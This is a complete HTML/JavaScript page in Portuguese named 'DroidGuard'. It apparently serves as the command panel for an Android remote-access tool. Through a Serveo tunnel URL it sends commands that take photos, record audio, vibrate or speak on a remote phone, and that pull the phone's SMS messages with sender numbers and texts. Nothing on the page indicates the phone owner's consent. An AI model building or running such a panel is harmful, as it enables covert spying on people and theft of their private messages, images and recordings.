<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>DroidGuard</title>
    <style>
        :root{--bg:#0a0a0f;--card:#111122;--gold:#ffd700;--green:#00ff88;--red:#ff4444;--text:#e0e0e0}
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:15px}
        .container{max-width:500px;margin:0 auto}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid var(--gold);border-radius:15px 15px 0 0}
        .header h1{color:var(--gold);font-size:1.5em;letter-spacing:3px}
        .card{background:var(--card);border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        input,button{width:100%;padding:14px;margin:5px 0;background:#000;border:1px solid #333;color:#fff;font-size:1em;border-radius:10px}
        button{background:var(--gold);color:#000;font-weight:bold;cursor:pointer}
        .green{background:var(--green);color:#000}.red{background:var(--red);color:#fff}
        .view{width:100%;height:280px;background:#000;display:flex;align-items:center;justify-content:center;border-radius:10px;overflow:hidden;margin:10px 0}
        .view img{width:100%;height:100%;object-fit:cover}
        .info{color:#888;font-size:.8em;text-align:center;margin:5px 0}
        .grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        .msg{background:#000;padding:10px;border-radius:8px;margin:5px 0;font-size:.8em;color:#aaa}
    </style>
</head>
<body>
<div class="container">
    <div class="header"><h1>DroidGuard</h1></div>
    <div class="card">
        <input type="text" id="url" placeholder="URL do Serveo: https://xxx.serveo.net">
        <button onclick="conectar()">🔗 CONECTAR</button>
    </div>
    <div id="painel" style="display:none">
        <div class="card">
            <div class="grid2">
                <button class="green" onclick="cmd('foto')">📸 Foto</button>
                <button class="red" onclick="cmd('audio')">🎤 Audio</button>
                <button onclick="cmd('vibrar')">📳 Vibrar</button>
                <button onclick="cmd('falar')">🗣️ Falar</button>
            </div>
            <button onclick="cmd('status')">📊 Status</button>
            <button onclick="cmd('sms')">💬 SMS</button>
        </div>
        <div class="view" id="view">📷</div>
        <audio id="audioPlayer" controls style="width:100%;display:none"></audio>
        <div class="info" id="info"></div>
        <div id="smsList"></div>
    </div>
</div>
<script>
var BASE='';

async function conectar(){
    var u=document.getElementById('url').value.trim();
    if(!u.startsWith('http'))u='https://'+u;
    try{
        var r=await fetch(u+'/id');
        var d=await r.json();
        BASE=u;
        document.getElementById('painel').style.display='block';
        document.getElementById('info').textContent='✅ Conectado: '+d.id;
        localStorage.setItem('dg_url',u);
    }catch(e){alert('Erro!')}
}

async function cmd(c){
    document.getElementById('info').textContent='⏳ '+c+'...';
    try{
        var r=await fetch(BASE+'/'+c);
        var d=await r.json();
        
        if(c=='foto' && d.foto){
            document.getElementById('view').innerHTML='<img src="data:image/jpeg;base64,'+d.foto+'">';
            document.getElementById('info').textContent='✅ Foto recebida!';
        }else if(c=='audio' && d.audio){
            var a=document.getElementById('audioPlayer');
            a.src='data:audio/aac;base64,'+d.audio;
            a.style.display='block';
            a.play();
            document.getElementById('info').textContent='✅ Áudio recebido!';
        }else if(c=='status'){
            try{
                var s=JSON.parse(d);
                document.getElementById('info').textContent='🔋 '+s.bateria+' | 🕐 '+s.time;
            }catch(e){}
        }else if(c=='sms' && d.sms){
            var h='';
            d.sms.forEach(function(s){
                h+='<div class="msg"><b>'+s.number+'</b> ('+s.received+')<br>'+s.body+'</div>';
            });
            document.getElementById('smsList').innerHTML=h;
            document.getElementById('info').textContent='✅ '+d.sms.length+' SMS';
        }else{
            document.getElementById('info').textContent='✅ OK';
        }
    }catch(e){
        document.getElementById('info').textContent='❌ Erro';
    }
}

var s=localStorage.getItem('dg_url');
if(s){document.getElementById('url').value=s;conectar();}
</script>
</body>
</html>
